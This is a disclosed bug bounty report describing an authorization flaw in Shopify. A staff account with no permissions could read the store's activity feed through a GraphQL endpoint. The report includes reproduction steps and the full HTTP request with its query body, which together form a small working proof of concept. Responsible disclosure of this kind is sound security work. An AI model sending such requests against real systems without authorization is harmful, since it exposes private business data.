# STAFF member with NO Explicit permissions can view `ActivityFeed` via GraphQL

## Report Details
- **Report ID**: 528940
- **URL**: https://hackerone.com/reports/528940
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-04-05T10:45:30.136Z
- **Disclosed**: 2019-06-18T09:22:39.611Z

## Reporter
- **Username**: h13-
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi,

This is similar to #95589. I noticed that `ActivityFeeds` are now being fetched by GraphQL call on Shopify. But from my testing, I noticed that STAFF member with _NO EXPLICIT_ permissions can fetch store's activity feed by calling the vulnerable endpoint.

__STEPS__

1.STAFF member is not assigned any permissions on Store. by Owner

2.STAFF member logs into store and navigates to `https://{store-name).myshopify.com/admin/activity` . As you can see below, the STAFF has no permissions to view activity feed
{F462884}

2.STAFF member logs into store and triggers the below GraphQL request.

```
POST /admin/api/graphql HTTP/1.1
Host: bir1.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
X-Shopify-Web-Force-Proxy: 1
Origin: https://bir1.myshopify.com
Content-Length: 577

{"operationName":"ActivityFeed","variables":{"first":20},"query":"query ActivityFeed($first: Int!) {\n  staffMember {\n    id\n    privateData {\n      activityFeed(first: $first) {\n        pageInfo {\n          hasNextPage\n          __typename\n        }\n        edges {\n          ...Activity\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment Activity on ActivityEdge {\n  cursor\n  node {\n    author\n    createdAt\n    messages\n    topic\n    attributed\n    __typename\n  }\n  __typename\n}\n"}
```

The response of the above request is follows,

{F462882}

As you can see, the STAFF member was able to view activity feeds of the Store

## Impact

By default, the store's `Activity Feed` must only be displayed to the STAFF having `Home` permissions. But using the above vulnerable GraphQL call, it was possible for a STAFF member with no permissions for fetch activity feed of a store.

Thanks,
@h13-

## Attachments
- p2.JPG
- p1.JPG
